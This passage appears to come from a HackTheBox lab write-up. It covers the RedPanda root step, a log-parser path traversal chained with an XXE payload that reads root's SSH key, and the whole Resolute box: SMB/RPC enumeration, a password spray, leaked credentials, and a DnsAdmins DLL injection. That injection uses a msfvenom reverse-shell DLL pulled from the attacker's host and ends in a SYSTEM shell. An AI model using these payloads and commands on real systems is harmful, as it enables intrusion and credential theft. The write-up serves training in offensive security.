<pre><code>woodenk@redpanda:/tmp$ id\nuid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)\n</code></pre> <p>Fun fact, I decided to get a shell with SSH for stability but the problem here was that the SSH session had less privileges than my reverse shell:</p> <pre><code>woodenk@redpanda:~$ id\nuid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)\n</code></pre> <p>In the SSH session we are not part of the <code>logs</code> group so let's avoid it. I tried to look for files owned by the <code>logs</code> group:</p> <pre><code>woodenk@redpanda:/$ find / -group logs 2&gt; /dev/null | grep -v woodenk | grep -v proc | grep -v tmp\n/opt/panda_search/redpanda.log\n/credits\n</code></pre> <p>The <code>redpanda.log</code> file is just a log with the requests that arrives to the web application we saw earlier, I noticed that it is cleared every now and then for some reason.</p> <p>Inside the <code>/credits</code> directory there are some XML files that looks like are responsible for storing the information about the different authors visit counter. Then, the <code>/opt</code> directory contains the files for two different services: <code>panda_search</code> and <code>credit-score</code>.</p> <p>In the <code>panda_search</code> source code I was able to find the password for the MySQL database (It is empty by the way). The password is also valid for the <code>woodenk</code> user in the box but as I said before, SSH session is not an option for now.</p> <pre><code>// /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java\n...\nconn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\");\n...\n</code></pre> <p>About the <code>credit-score</code> service, according to <code>pspy</code> it is executed by the <code>root</code> user every minute or so:</p> <pre><code>2022/11/25 12:26:01 CMD: UID=0    PID=4592   | /usr/sbin/CRON -f \n2022/11/25 12:26:01 CMD: UID=0    PID=4595   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar \n2022/11/25 12:26:01 CMD: UID=0    PID=4594   | /bin/sh /root/run_credits.sh \n2022/11/25 12:26:01 CMD: UID=0    PID=4593   | /bin/sh -c /root/run_credits.sh\n</code></pre> <p>Checking the code of the application, it is looking for log lines in the file <code>/opt/panda_search/redpanda.log</code> with the substring \".jpg\" in them. If the program finds a match, the service will determine that someone watched a photo and add a new visit to its artist.</p> <p>This is the application code:</p> <pre><code>// /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java\npackage com.logparser;\nimport java.io.BufferedWriter;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\nimport com.drew.imaging.jpeg.JpegMetadataReader;\nimport com.drew.imaging.jpeg.JpegProcessingException;\nimport com.drew.metadata.Directory;\nimport com.drew.metadata.Metadata;\nimport com.drew.metadata.Tag;\n\nimport org.jdom2.JDOMException;\nimport org.jdom2.input.SAXBuilder;\nimport org.jdom2.output.Format;\nimport org.jdom2.output.XMLOutputter;\nimport org.jdom2.*;\n\npublic class App {\n    public static Map parseLog(String line) {\n        String[] strings = line.split(\"\\\\|\\\\|\");\n        Map map = new HashMap&lt;&gt;();\n        map.put(\"status_code\", Integer.parseInt(strings[0]));\n        map.put(\"ip\", strings[1]);\n        map.put(\"user_agent\", strings[2]);\n        map.put(\"uri\", strings[3]);\n\n\n        return map;\n    }\n    public static boolean isImage(String filename){\n        if(filename.contains(\".jpg\"))\n        {\n            return true;\n        }\n        return false;\n    }\n    public static String getArtist(String uri) throws IOException, JpegProcessingException\n    {\n        String fullpath = \"/opt/panda_search/src/main/resources/static\" + uri;\n        File jpgFile = new File(fullpath);\n        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);\n        for(Directory dir : metadata.getDirectories())\n        {\n            for(Tag tag : dir.getTags())\n            {\n                if(tag.getTagName() == \"Artist\")\n                {\n                    return tag.getDescription();\n                }\n            }\n        }\n\n        return \"N/A\";\n    }\n    public static void addViewTo(String path, String uri) throws JDOMException, IOException\n    {\n        SAXBuilder saxBuilder = new SAXBuilder();\n        XMLOutputter xmlOutput = new XMLOutputter();\n        xmlOutput.setFormat(Format.getPrettyFormat());\n\n        File fd = new File(path);\n\n        Document doc = saxBuilder.build(fd);\n\n        Element rootElement = doc.getRootElement();\n\n        for(Element el: rootElement.getChildren())\n        {\n\n\n            if(el.getName() == \"image\")\n            {\n                if(el.getChild(\"uri\").getText().equals(uri))\n                {\n                    Integer totalviews = Integer.parseInt(rootElement.getChild(\"totalviews\").getText()) + 1;\n                    System.out.println(\"Total views:\" + Integer.toString(totalviews));\n                    rootElement.getChild(\"totalviews\").setText(Integer.toString(totalviews));\n                    Integer views = Integer.parseInt(el.getChild(\"views\").getText());\n                    el.getChild(\"views\").setText(Integer.toString(views + 1));\n                }\n            }\n        }\n        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));\n        xmlOutput.output(doc, writer);\n    }\n    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {\n        File log_fd = new File(\"/opt/panda_search/redpanda.log\");\n        Scanner log_reader = new Scanner(log_fd);\n        while(log_reader.hasNextLine())\n        {\n            String line = log_reader.nextLine();\n            if(!isImage(line))\n            {\n                continue;\n            }\n            Map parsed_data = parseLog(line);\n            System.out.println(parsed_data.get(\"uri\"));\n            String artist = getArtist(parsed_data.get(\"uri\").toString());\n            System.out.println(\"Artist: \" + artist);\n            String xmlPath = \"/credits/\" + artist + \"_creds.xml\";\n            addViewTo(xmlPath, parsed_data.get(\"uri\").toString());\n        }\n\n    }\n}\n</code></pre> <p>I will try to summarize what the code is doing:</p> <ul> <li>The program start reading one by one the lines in the log file <code>/opt/panda_search/redpanda.log</code>.</li> <li>If the line contains the substring <code>.jpg</code> the program will process it if not it just continues reading.</li> <li>Once the substring is found in a line, the program parse the line to extract the status code, the ip address of the client, the user agend of the client and the URL visited.</li> <li>From the URL the program build a path to the image the client checked to get the artist name from the image metadata.</li> <li>Once the artist name is obtained, the code build another path, this time to the XML file holding the information for the artist.</li> <li>The code add 1 to the visit count of the artist photo that the client visited and also adds 1 to the total visits of the artist.</li> </ul>"},{"location":"HackTheBox/RedPanda/#exploit-time","title":"Exploit time","text":"<p>The problem with this code is that it is building paths to files without sanitizing the user input so we can abuse it and perform a path traversal attack. This is the idea:</p> <ul> <li> <p>Introducing this line into the log file will make the code look for a image outside the expected directory, since we have control over <code>/tmp</code> we can use whatever image we want: <pre><code>200||localhost||AGENT||/../../../../../../../tmp/mal.jpg\n</code></pre></p> </li> <li> <p>The image will have a metadata tag called <code>Artist</code> with a path traversal payload. The idea is to force it to search for a XML for this Artist in the <code>/tmp</code>: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/RedPanda/privesc]\n\u2514\u2500$ exiftool -Artist=\"../../../../../../../../../../tmp/mal\" mal.jpg\n    1 image files updated\n</code></pre></p> </li> <li>For the final part of the exploit, the XML file, that we will force the code to process, will contain an external entity (XXE) to read the SSH key of the <code>root</code> user: <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY exploit SYSTEM \"/root/.ssh/id_rsa\"&gt; ]&gt;\n&lt;credits&gt;\n  &lt;author&gt;damian&lt;/author&gt;\n  &lt;image&gt;\n    &lt;uri&gt;/../../../../../../../tmp/mal.jpg&lt;/uri&gt;\n    &lt;views&gt;0&lt;/views&gt;\n  &lt;/image&gt;\n  &lt;totalviews&gt;0&lt;/totalviews&gt;\n  &lt;data&gt;&amp;exploit;&lt;/data&gt;\n&lt;/credits&gt;\n</code></pre></li> </ul> <p>After putting the malicious XML file and the custom image in the <code>/tmp</code> directory, we can add the line  I mentioned above in the log file and wait for the magic to happen. Eventually, if we check the XML file the <code>data</code> tag will now contain the private SSH key of the <code>root</code> user.</p> <p>Since the SSH configuration allows the <code>root</code> user to connect through SSH, we can now use it to connect through SSH and get the flag!</p>"},{"location":"HackTheBox/Resolute/","title":"Resolute","text":""},{"location":"HackTheBox/Resolute/#nmap","title":"Nmap","text":"<p>Time for the typical Nmap scan!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- 10.10.10.169\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 07:54 EST\nNmap scan report for 10.10.10.169\nHost is up (0.050s latency).\nNot shown: 65511 closed tcp ports (reset)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49671/tcp open  unknown\n49676/tcp open  unknown\n49677/tcp open  unknown\n49682/tcp open  unknown\n49923/tcp open  unknown\n60062/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 26.86 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.169\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 08:02 EST\nNmap scan report for 10.10.10.169\nHost is up (0.050s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-21 13:09:16Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_clock-skew: mean: 2h47m05s, deviation: 4h37m10s, median: 7m03s\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Resolute\n|   NetBIOS computer name: RESOLUTE\\x00\n|   Domain name: megabank.local\n|   Forest name: megabank.local\n|   FQDN: Resolute.megabank.local\n|_  System time: 2022-11-21T05:09:26-08:00\n| smb2-time: \n|   date: 2022-11-21T13:09:25\n|_  start_date: 2022-11-20T20:49:00\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.79 seconds\n</code></pre> <p>We have a Windows machine that looks like a domain controller. We have some domain information like the name of the domain: <code>megabank.local</code> which could be important if we want to login. I added it to my hosts file.</p> <p>I will try to enumerate SMB first and then we could check MSRPC before trying to attack Kerberos.</p>"},{"location":"HackTheBox/Resolute/#smb","title":"SMB","text":"<p>Using <code>enum4linux</code> I was able to get information about existing users and groups. I just let the relevant information here:</p> <pre><code> ================================( Getting domain SID for 10.10.10.169 )================================\n\nDomain Name: MEGABANK\nDomain Sid: S-1-5-21-1392959593-3013219662-3596683436\n\n[+] Host is part of a domain (not a workgroup)\n\n\n =======================================( Users on 10.10.10.169 )=======================================\n\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[DefaultAccount] rid:[0x1f7]\nuser:[ryan] rid:[0x451]\nuser:[marko] rid:[0x457]\nuser:[sunita] rid:[0x19c9]\nuser:[abigail] rid:[0x19ca]\nuser:[marcus] rid:[0x19cb]\nuser:[sally] rid:[0x19cc]\nuser:[fred] rid:[0x19cd]\nuser:[angela] rid:[0x19ce]\nuser:[felicia] rid:[0x19cf]\nuser:[gustavo] rid:[0x19d0]\nuser:[ulf] rid:[0x19d1]\nuser:[stevie] rid:[0x19d2]\nuser:[claire] rid:[0x19d3]\nuser:[paulo] rid:[0x19d4]\nuser:[steve] rid:[0x19d5]\nuser:[annette] rid:[0x19d6]\nuser:[annika] rid:[0x19d7]\nuser:[per] rid:[0x19d8]\nuser:[claude] rid:[0x19d9]\nuser:[melanie] rid:[0x2775]\nuser:[zach] rid:[0x2776]\nuser:[simon] rid:[0x2777]\nuser:[naoki] rid:[0x2778]\n\n\n ============================( Password Policy Information for 10.10.10.169 )============================\n\n\n\n[+] Attaching to 10.10.10.169 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n    [!] Protocol failed: Cannot request session (Called Name:10.10.10.169)\n\n[+] Trying protocol 445/SMB...\n\n[+] Found domain(s):\n\n    [+] MEGABANK\n    [+] Builtin\n\n[+] Password Info for Domain: MEGABANK\n\n    [+] Minimum password length: 7\n    [+] Password history length: 24\n    [+] Maximum password age: Not Set\n    [+] Password Complexity Flags: 000000\n\n        [+] Domain Refuse Password Change: 0\n        [+] Domain Password Store Cleartext: 0\n        [+] Domain Password Lockout Admins: 0\n        [+] Domain Password No Clear Change: 0\n        [+] Domain Password No Anon Change: 0\n        [+] Domain Password Complex: 0\n\n    [+] Minimum password age: 1 day 4 minutes \n    [+] Reset Account Lockout Counter: 30 minutes \n    [+] Locked Account Duration: 30 minutes \n    [+] Account Lockout Threshold: None\n    [+] Forced Log off Time: Not Set\n\n\n\n[+] Retieved partial password policy with rpcclient:\n\n\nPassword Complexity: Disabled\nMinimum Password Length: 7\n\n\n =======================================( Groups on 10.10.10.169 )=======================================\n\n\n[+] Getting builtin groups:\n\ngroup:[Account Operators] rid:[0x224]\ngroup:[Pre-Windows 2000 Compatible Access] rid:[0x22a]\ngroup:[Incoming Forest Trust Builders] rid:[0x22d]\ngroup:[Windows Authorization Access Group] rid:[0x230]\ngroup:[Terminal Server License Servers] rid:[0x231]\ngroup:[Administrators] rid:[0x220]\ngroup:[Users] rid:[0x221]\ngroup:[Guests] rid:[0x222]\ngroup:[Print Operators] rid:[0x226]\ngroup:[Backup Operators] rid:[0x227]\ngroup:[Replicator] rid:[0x228]\ngroup:[Remote Desktop Users] rid:[0x22b]\ngroup:[Network Configuration Operators] rid:[0x22c]\ngroup:[Performance Monitor Users] rid:[0x22e]\ngroup:[Performance Log Users] rid:[0x22f]\ngroup:[Distributed COM Users] rid:[0x232]\ngroup:[IIS_IUSRS] rid:[0x238]\ngroup:[Cryptographic Operators] rid:[0x239]\ngroup:[Event Log Readers] rid:[0x23d]\ngroup:[Certificate Service DCOM Access] rid:[0x23e]\ngroup:[RDS Remote Access Servers] rid:[0x23f]\ngroup:[RDS Endpoint Servers] rid:[0x240]\ngroup:[RDS Management Servers] rid:[0x241]\ngroup:[Hyper-V Administrators] rid:[0x242]\ngroup:[Access Control Assistance Operators] rid:[0x243]\ngroup:[Remote Management Users] rid:[0x244]\ngroup:[System Managed Accounts Group] rid:[0x245]\ngroup:[Storage Replica Administrators] rid:[0x246]\ngroup:[Server Operators] rid:[0x225]\n\n[+]  Getting local groups:\n\ngroup:[Cert Publishers] rid:[0x205]\ngroup:[RAS and IAS Servers] rid:[0x229]\ngroup:[Allowed RODC Password Replication Group] rid:[0x23b]\ngroup:[Denied RODC Password Replication Group] rid:[0x23c]\ngroup:[DnsAdmins] rid:[0x44d]\n\n[+]  Getting domain groups:\n\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\ngroup:[Contractors] rid:[0x44f]\n\n[+]  Getting domain group memberships:\n\nGroup: 'Domain Admins' (RID: 512) has member: MEGABANK\\Administrator\nGroup: 'Schema Admins' (RID: 518) has member: MEGABANK\\Administrator\nGroup: 'Domain Controllers' (RID: 516) has member: MEGABANK\\RESOLUTE$\nGroup: 'Domain Guests' (RID: 514) has member: MEGABANK\\Guest\nGroup: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\\Administrator\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\Administrator\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\DefaultAccount\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\krbtgt\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\ryan\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\marko\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\sunita\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\abigail\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\marcus\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\sally\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\fred\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\angela\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\felicia\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\gustavo\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\ulf\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\stevie\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\claire\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\paulo\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\steve\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\annette\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\annika\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\per\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\claude\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\melanie\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\zach\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\simon\nGroup: 'Domain Users' (RID: 513) has member: MEGABANK\\naoki\nGroup: 'Domain Computers' (RID: 515) has member: MEGABANK\\MS02$\nGroup: 'Contractors' (RID: 1103) has member: MEGABANK\\ryan\nGroup: 'Enterprise Admins' (RID: 519) has member: MEGABANK\\Administrator\n\n ==================( Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050) )==================\n</code></pre> <p>There is no shares we can access so time to move on to MSRPC and see what we can see there. We have a list of users RIDs so maybe we can enumerate them.</p>"},{"location":"HackTheBox/Resolute/#msrpc","title":"MSRPC","text":"<p>Using <code>rpcclient 10.10.10.169 -U '' -N</code> I was able to connect to the service and start querying information. I started by checking each user and after a while I got something insteresting when checking the user <code>marko</code>:</p> <pre><code>rpcclient $&gt; queryuser 0x457\n    User Name   :   marko\n    Full Name   :   Marko Novak\n    Home Drive  :   \n    Dir Drive   :   \n    Profile Path:   \n    Logon Script:   \n    Description :   Account created. Password set to Welcome123!\n    Workstations:   \n    Comment     :   \n    Remote Dial :\n    Logon Time               :  Wed, 31 Dec 1969 19:00:00 EST\n    Logoff Time              :  Wed, 31 Dec 1969 19:00:00 EST\n    Kickoff Time             :  Wed, 13 Sep 30828 22:48:05 EDT\n    Password last set Time   :  Fri, 27 Sep 2019 09:17:15 EDT\n    Password can change Time :  Sat, 28 Sep 2019 09:17:15 EDT\n    Password must change Time:  Wed, 13 Sep 30828 22:48:05 EDT\n    unknown_2[0..31]...\n    user_rid :  0x457\n    group_rid:  0x201\n    acb_info :  0x00000210\n    fields_present: 0x00ffffff\n    logon_divs: 168\n    bad_password_count: 0x00000000\n    logon_count:    0x00000000\n    padding1[0..7]...\n    logon_hrs[0..21]...\n</code></pre> <p>In the description I found what looks like a default password for new accounts: <code>Welcome123!</code>. I tried the password with <code>crackmapexec</code> but no luck, the thing is that maybe another user use this password.</p>"},{"location":"HackTheBox/Resolute/#password-spray-attack","title":"Password spray attack","text":"<p>I will try to spray the found password through all the users in the domain and pray:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ crackmapexec winrm -u /home/kali/Documents/HTB/Resolute/users.txt -p 'Welcome123!' -d MEGABANK 10.10.10.169\nHTTP        10.10.10.169    5985   10.10.10.169     [*] http://10.10.10.169:5985/wsman\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\Administrator:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\Guest:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\krbtgt:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\DefaultAccount:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\ryan:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\marko:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\sunita:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\abigail:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\marcus:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\sally:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\fred:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\angela:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\felicia:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\gustavo:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\ulf:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\stevie:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\claire:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\paulo:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\steve:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\annette:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\annika:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\per:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [-] MEGABANK\\claude:Welcome123!\nWINRM       10.10.10.169    5985   10.10.10.169     [+] MEGABANK\\melanie:Welcome123! (Pwn3d!)\n</code></pre> <p>Cool! We should be able to get a shell to the machine as <code>melanie</code> using <code>evil-winrm</code>.</p>"},{"location":"HackTheBox/Resolute/#privilege-escalation-to-ryan","title":"Privilege escalation to <code>ryan</code>","text":"<p>Just using <code>evil-winrm</code> we can login to the victim host and get a shell. You can get the user flag from the <code>Desktop</code> directory.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'     \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents&gt;\n</code></pre> <p>At this point I started looking around and I found a hidden directory called <code>PSTranscripts</code>:</p> <pre><code>*Evil-WinRM* PS C:\\&gt; ls -force\n\n\n    Directory: C:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd--hs-       11/20/2022   2:14 PM                $RECYCLE.BIN\nd--hsl        9/25/2019  10:17 AM                Documents and Settings\nd-----        9/25/2019   6:19 AM                PerfLogs\nd-r---        9/25/2019  12:39 PM                Program Files\nd-----       11/20/2016   6:36 PM                Program Files (x86)\nd--h--        9/25/2019  10:48 AM                ProgramData\nd--h--        12/3/2019   6:32 AM                PSTranscripts\nd--hs-        9/25/2019  10:17 AM                Recovery\nd--hs-        9/25/2019   6:25 AM                System Volume Information\nd-----       11/20/2022   2:12 PM                temp\nd-r---        12/4/2019   2:46 AM                Users\nd-----        12/4/2019   5:15 AM                Windows\n-arhs-       11/20/2016   5:59 PM         389408 bootmgr\n-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT\n-a-hs-       11/20/2022  12:48 PM      402653184 pagefile.sys\n</code></pre> <p>Inside it, I found what looks like a Powershell session transcript from <code>ryan</code>. Inside it we can find its credentials!</p> <pre><code>...\ncmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n...\n</code></pre> <p>Now we can connect as <code>ryan</code> by also using <code>evil-winrm</code>.</p>"},{"location":"HackTheBox/Resolute/#time-to-pwn-this","title":"Time to pwn this","text":"<p>The first thing I found is this:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Desktop&gt; cat note.txt\nEmail to team:\n\n- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute\n</code></pre> <p>Looks like the change we make to the machine are reverted every minute, good to know. Next, I checked the accound privileges:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Desktop&gt; whoami -all\n\nUSER INFORMATION\n----------------\n\nUser Name     SID\n============= ==============================================\nmegabank\\ryan S-1-5-21-1392959593-3013219662-3596683436-1105\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                            Attributes\n========================================== ================ ============================================== ===============================================================\nEveryone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group\nMEGABANK\\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group\nMEGABANK\\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level     Label            S-1-16-8192\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>What I noticed is that the user is part of <code>MEGABANK\\DnsAdmins</code>, googling a bit I found something we can use.</p> <p>Basically, we should be able to inject a custom DLL into the DNS service. After that, we should restart the service and the DLL code will run with high privileges. Let's generate the payload:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Resolute]\n\u2514\u2500$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=3333 -f dll&gt; dns.dll\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 8704 bytes\n</code></pre> <p>To pass the file to the target, I will use a SMB server with Samba. The box looks like has an AV in place so using this method I can easily share the DLL through the network without touching the disk (Avoiding the AV).</p> <p>Time to get all working, I started a Netcat listener and then injected the DLL and restarted the service:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\ryan\\Documents&gt; cmd /c \"dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\\\10.10.14.2\\public\\dns.dll &amp; sc stop dns &amp; sc start dns\"\n</code></pre> <p>As you can see we get a shell as <code>nt authority\\system</code> and we can finally get the flag!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ rlwrap nc -lnvp 3333\nlistening on [any] 3333 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.169] 50214\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt 